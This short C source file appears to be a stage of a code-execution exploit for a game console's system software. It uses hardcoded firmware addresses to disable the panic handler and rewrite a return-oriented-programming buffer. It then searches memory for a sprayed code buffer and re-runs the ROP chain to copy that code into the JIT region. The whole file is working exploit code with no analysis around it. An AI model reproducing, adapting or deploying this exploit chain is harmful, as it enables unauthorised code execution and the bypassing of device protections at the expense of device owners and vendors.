#define OSFatal ((void (*)(char* msg))0x1031368)
#define __os_snprintf ((int(*)(char* s, int n, const char * format, ... ))0x102f09c)
#define rop ((void (*)(unsigned int r3))0xd8f502c)
#define memcpy ((void * (*)(void * destination, const void * source, int num))0x1035a6c)

#define BUFFER_ADDR 0x1b201814
#define CODE_START	0xCAFECAFE
#define OSPANIC_CB	0x1003AAAC

void start()
{
	/* Set up a different stack */
    asm("stwu %r1,-0x2000(%r1)");

	/* Remove the OSPanic() callback */
	unsigned int *ospanic_cb = (unsigned int*)OSPANIC_CB;
	ospanic_cb[0] = ospanic_cb[1] = 0;

	/* Copy another version of the ROP buffer over the original */
	unsigned int *ropbuf = (unsigned int*)BUFFER_ADDR;
	memcpy(ropbuf, (void*)BUFFER_ADDR + 0x1000, 0x5c0);

	/* Look for the code buffer (checking the start, middle, and end) */
	unsigned int *codebuf = (unsigned int*)BUFFER_ADDR;
	while (codebuf < (unsigned int*)0x20000000)
	{
		if (*codebuf == CODE_START &&
			codebuf[0x4000/4] == ropbuf[0x190/4] &&
			codebuf[0x7FFC/4] == ropbuf[0x194/4]) break;
		codebuf++;
	}
	if (codebuf == 0x20000000) ((void (*)())0x101cd70)();

	/* Modify the ROP buffer to copy the code spray into the JIT */
	ropbuf[0x318/4] = &ropbuf[0xa0/4];
	ropbuf[0xdc/4] = codebuf + 1;
	ropbuf[0xe0/4] = 0x8000;

	/* Perform ROP again */
    rop(BUFFER_ADDR + 0x30c);
}
